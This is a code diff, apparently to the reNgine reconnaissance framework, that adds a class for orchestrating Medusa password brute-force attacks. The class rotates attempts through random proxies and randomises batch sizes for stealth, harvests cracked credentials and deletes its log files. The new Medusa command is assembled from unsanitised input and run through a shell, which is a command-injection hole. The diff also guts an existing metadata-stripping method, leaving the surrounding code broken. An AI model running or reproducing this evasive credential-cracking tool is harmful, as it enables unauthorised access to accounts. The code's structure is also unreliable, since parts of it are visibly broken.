@@ -1,6 +1,10 @@
 import os
 import random
+import re
+import tempfile
+import subprocess
 from scanEngine.models import OpSec, Proxy
+from reNgine.definitions import MEDUSA_EXEC_PATH, PROXYCHAINS_EXEC_PATH
 
 class OpSecManager:
     """
@@ -161,9 +165,118 @@ class OpSecManager:
         if not self.is_enabled() or not self.settings.enable_metadata_stripping:
             return
         
-        if not os.path.exists(directory):
-            return
 
-        for root, dirs, files in os.walk(directory):
-            for file in files:
-                self.strip_metadata(os.path.join(root, file))
+class ProxychainsWrapper:
+    """
+    Handles dynamic generation of proxychains configurations for stealthy rotation.
+    """
+    def __init__(self):
+        self.proxies = self._fetch_proxies()
+
+    def _fetch_proxies(self):
+        proxy_obj = Proxy.objects.first()
+        if not proxy_obj or not proxy_obj.proxies:
+            return []
+        
+        # Clean and validate proxy list
+        proxies = []
+        for line in proxy_obj.proxies.splitlines():
+            line = line.strip()
+            if not line or line.startswith('#'):
+                continue
+            # Support both "socks5 1.2.3.4 1080" and "1.2.3.4:1080" formats
+            if ' ' in line:
+                proxies.append(line)
+            elif ':' in line:
+                # Default to socks5 if not specified
+                proxies.append(f"socks5 {line.replace(':', ' ')}")
+        return proxies
+
+    def get_random_proxy(self):
+        return random.choice(self.proxies) if self.proxies else None
+
+    def write_temp_config(self, proxy_str):
+        fd, path = tempfile.mkstemp(suffix=".conf", prefix="proxychains_")
+        with os.fdopen(fd, 'w') as f:
+            f.write("strict_chain\n")
+            f.write("proxy_dns\n")
+            f.write("tcp_read_time_out 15000\ntcp_connect_time_out 8000\n")
+            f.write("[ProxyList]\n")
+            f.write(f"{proxy_str}\n")
+        return path
+
+
+class BruteForceOrchestrator:
+    """
+    Orchestrates Medusa brute-force attacks with proxy rotation and stealth.
+    """
+    def __init__(self, target, service, port=None, users=[], passwords=[]):
+        self.target = target
+        self.service = service
+        self.port = port
+        self.users = users
+        self.passwords = passwords
+        self.proxy_manager = ProxychainsWrapper()
+        self.results = []
+
+    def _generate_combos(self):
+        combos = []
+        for u in self.users:
+            for p in self.passwords:
+                combos.append((u, p))
+        random.shuffle(combos)
+        return combos
+
+    def run(self, min_attempts=1, max_attempts=10, stop_on_success=True):
+        combos = self._generate_combos()
+        i = 0
+        while i < len(combos):
+            # Determine batch size (1-10 attempts)
+            batch_size = random.randint(min_attempts, max_attempts)
+            batch = combos[i:i+batch_size]
+            i += batch_size
+
+            # Create temp combo file for Medusa
+            fd, combo_file = tempfile.mkstemp(suffix=".txt", prefix="medusa_combo_")
+            with os.fdopen(fd, 'w') as f:
+                for user, password in batch:
+                    f.write(f"{user}:{password}\n")
+
+            # Setup proxy
+            proxy = self.proxy_manager.get_random_proxy()
+            cmd_prefix = ""
+            conf_path = None
+            if proxy:
+                conf_path = self.proxy_manager.write_temp_config(proxy)
+                cmd_prefix = f"{PROXYCHAINS_EXEC_PATH} -f {conf_path} "
+
+            # Build Medusa command
+            # -h host, -n port, -M service, -C combo_file, -O output
+            port_flag = f"-n {self.port}" if self.port else ""
+            output_file = f"/tmp/medusa_{self.target}_{random.randint(1000,9999)}.log"
+            
+            medusa_cmd = f"{cmd_prefix}{MEDUSA_EXEC_PATH} -h {self.target} {port_flag} -M {self.service} -C {combo_file} -O {output_file}"
+            
+            try:
+                subprocess.run(medusa_cmd, shell=True, timeout=300)
+                if os.path.exists(output_file):
+                    with open(output_file, 'r') as f:
+                        output = f.read()
+                        # Medusa success pattern: "ACCOUNT FOUND"
+                        if "ACCOUNT FOUND" in output:
+                            found = re.findall(r"ACCOUNT FOUND: \[(.*?)\] User: \[(.*?)\] Password: \[(.*?)\]", output)
+                            for match in found:
+                                self.results.append({
+                                    'user': match[1],
+                                    'password': match[2],
+                                    'target': self.target,
+                                    'service': self.service
+                                })
+                            if stop_on_success:
+                                break
+            finally:
+                if os.path.exists(combo_file): os.remove(combo_file)
+                if conf_path and os.path.exists(conf_path): os.remove(conf_path)
+                if os.path.exists(output_file): os.remove(output_file)
+
+        return self.results
